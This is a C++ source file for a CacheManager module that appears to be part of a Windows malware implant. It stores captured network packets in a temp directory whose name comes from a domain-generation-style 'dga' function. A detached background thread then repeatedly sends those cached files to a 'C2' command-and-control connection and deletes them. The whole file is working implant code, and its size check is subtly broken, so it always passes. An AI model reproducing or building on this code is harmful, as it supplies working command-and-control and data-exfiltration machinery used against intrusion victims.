#include "cachemanager.h"

CacheManager::CacheManager(int mf, C2* c2ptr) : max_files{ mf }, c2connection{c2ptr}
{
	auto tmpdir = fs::temp_directory_path();
	int spec_val = ((conf::dgaseed * 2) % 512)+1;
	auto subdir = fs::path(dga(spec_val));

	fsroot = (tmpdir / subdir).string();
	make_fsroot();
}


int CacheManager::cache(netpack::Packet& tocache)
{
	std::string fname = rand_avail_filename();

	auto netdata = tocache.full();
	size_t sz = netdata.size();

	LOG("caching packet of size " << sz << " into " << fname);

	std::fstream outfile;
	outfile.open(fname, std::ios::app | std::ios::binary);
	outfile.write((char*)netdata.data(), sz);
	outfile.close();

	return 0;
}

void CacheManager::start_report_thread()
{
	std::thread t(&CacheManager::report_cache_t, this);
	t.detach();
}

std::string CacheManager::rand_avail_filename() {
	stringvec files = list_files(fsroot);
	for (;;) {
		std::string fname = rand_filename(10);
		if (std::find(files.begin(), files.end(), fname) == files.end()) {
			return (fs::path(fsroot) / fs::path(fname)).string();
		}
	}
};

void CacheManager::make_fsroot()
{
	if (!fs::exists(fsroot)) {
		fs::create_directories(fsroot);
	}
}

stringvec CacheManager::list_files(const std::string& dir)
{
	stringvec out;

	for (const auto& entry : fs::directory_iterator(dir, fs::directory_options::skip_permission_denied)) {

		if (entry.is_regular_file()) {
			out.push_back(entry.path().filename().string());
		}

	}
	return out;
}

void CacheManager::release_file(std::string id) {

	std::string mutex = std::string("Global\\") + id;
	HANDLE h = CreateMutexA(NULL, FALSE, mutex.c_str());

	if (h != NULL) {

		auto pos = std::find(aquired_files.begin(), aquired_files.end(), h);
		if (pos != aquired_files.end()) {

			ReleaseMutex(h);
			CloseHandle(h);
			aquired_files.erase(pos);

		}
	}
}

void CacheManager::report_cached(std::string fname) {

	std::string absname = (fs::path(fsroot) / fs::path(fname)).string();

	if (aquire_file(fname)) {

		std::ifstream file(absname, std::ios::binary | std::ios::ate);
		auto size = file.tellg();

		if (1 <= size <= 1024 * 100) {
			LOG("reporting cached file: " << fname);

			file.seekg(0, std::ios::beg);

			std::vector<char> buf(size);

			if (file.read(buf.data(), size)) {

				c2connection->send_raw(buf.data(), size);
				file.close();
				fs::remove(absname);

			}
		}

		if (file.is_open()){
			file.close();
		}

		release_file(fname);
	}

}

void CacheManager::report_cache_t()
{
	while (true) {
		Sleep(5000);
		if (c2connection->is_alive()) {
			for (auto fname : list_files(fsroot)) {

				try {
					report_cached(fname);
				}
				catch (std::exception e) {
					LOG("Exception when reporting cached file " << fname << " : " << e.what());
				}

			}

		}
	}
}

bool CacheManager::aquire_file(std::string id)
{
	for (auto& el : list_files(fsroot)) {
		if (id == el) {
			goto found;
		}
	}return false;

	found:

	std::string mutex = std::string("Global\\") + id;
	HANDLE h = CreateMutexA(NULL, FALSE, mutex.c_str());

	if (h != NULL) {

		DWORD ret = WaitForSingleObject(h, 0);
		if (ret == WAIT_ABANDONED || ret == WAIT_OBJECT_0) {
			aquired_files.push_back(h);
			return true;
		}
	}
	return false;

}
